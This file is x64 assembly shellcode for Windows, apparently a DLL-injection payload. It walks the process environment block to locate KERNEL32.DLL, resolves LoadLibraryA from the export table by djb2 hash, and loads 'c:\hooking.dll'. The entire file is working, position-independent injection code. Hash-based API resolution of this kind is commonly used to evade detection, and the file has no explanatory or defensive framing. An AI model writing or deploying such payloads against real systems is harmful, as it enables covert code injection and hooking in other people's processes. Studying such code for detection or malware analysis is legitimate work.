BITS 64

section .text
global _main

; the main function
_main:
    mov rax, rsp
    and rsp, 0xffffffffffffff00
    add rsp, 8
    push rax

    call get_rip

get_rip:
    pop r15

    mov rcx, 0x6ddb9555	; djb2("KERNEL32.DLL")
    call get_module_base
    mov r12, rax

    cmp rax, 0
    je end

    mov rcx, 0x5fbff0fb	; djb2("LoadLibraryA")
    mov rdx, r12
    call resolve_import

    cmp rax, 0
    je end

    sub rsp, 16

    lea rcx, [r15+dll_path-get_rip]
    call rax			; LoadLibraryA("c:\\hooking.dll")

    add rsp, 16

    jmp end

; djb2 hash function
; rcx - the address of the string (must be null-terminated)
; rdx - the char size (1 for ascii, 2 for widechar) 
djb2:
    push rbx
    push rdi

    mov eax, 5381

.hash_loop:
    cmp byte [rcx], 0
    je .return_from_func

    mov ebx, eax
    shl eax, 5
    add eax, ebx
    movzx rdi, byte [rcx]
    add eax, edi

    add rcx, rdx

    jmp .hash_loop

.return_from_func:
    pop rdi
    pop rbx

    ret

; module resolving function
; rcx - module name djb2 hash
get_module_base:
    push rbx
    
    mov r11, [gs:0x60]
    mov r11, [r11+0x18]

    lea r11, [r11+0x20]
    mov rbx, [r11]

.find_module_loop:
    push rcx

    mov rcx, [rbx+0x50]
    mov rdx, 2
    call djb2

    pop rcx

    cmp rax, rcx
    je .module_found

    mov rbx, [rbx]

    cmp rbx, r11
    jne .find_module_loop

.module_not_found:
    mov rax, 0
    jmp .return_from_func

.module_found:
    mov rax, [rbx+0x20]

.return_from_func:
    pop rbx
    ret

; import resolving function
; rcx - import name djb2 hash
; rdx - module base address
resolve_import:
    push r11
    push r12
    push r13
    push r14
    push r15
    push rbx

.parse_pe_export_headers:
    mov rbx, rdx            ; ImageBase

    movzx rdx, word [rbx+0x3c]
    add rdx, rbx

    mov edx, dword [rdx+0x88]
    add rdx, rbx

    mov r11d, [rdx+0x1c]    ; AddressOfFunctions
    add r11, rbx

    mov r12d, [rdx+0x20]    ; AddressOfNames
    add r12, rbx

    mov r13d, [rdx+0x24]    ; AddressOfNameOrdinals
    add r13, rbx

    mov r14d, [rdx+0x14]    ; NumberOfFunctions

    mov r15, 0

.resolve_import_loop:
    push rcx

    mov ecx, dword [r12+r15*4]
    add rcx, rbx
    mov rdx, 1
    call djb2

    pop rcx

    cmp rax, rcx
    je .import_found

    inc r15
    cmp r15, r14
    jne .resolve_import_loop

    mov rax, 0
    jmp .return_from_func

.import_found:
    movzx rax, word [r13+r15*2]
    mov eax, dword [r11+rax*4]
    add rax, rbx

.return_from_func:
    pop rbx
    pop r15
    pop r14
    pop r13
    pop r12
    pop r11

    ret

dll_path:
    db "c:\\hooking.dll", 0

end:
    pop rsp
    ret
